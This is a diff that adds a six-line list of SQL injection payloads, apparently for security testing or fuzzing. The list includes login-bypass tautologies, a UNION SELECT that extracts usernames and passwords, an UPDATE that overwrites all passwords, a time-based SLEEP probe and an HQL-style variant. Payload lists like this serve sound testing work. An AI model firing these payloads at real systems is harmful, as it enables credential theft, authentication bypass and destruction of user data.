@@ -1,0 +1,6 @@
+' OR '1'='1
+' OR 1=1--
+' UNION SELECT username,password FROM users--
+'; UPDATE users SET password='hacked'--
+' AND SLEEP(5)--
+from=User where name='' or '1'='1
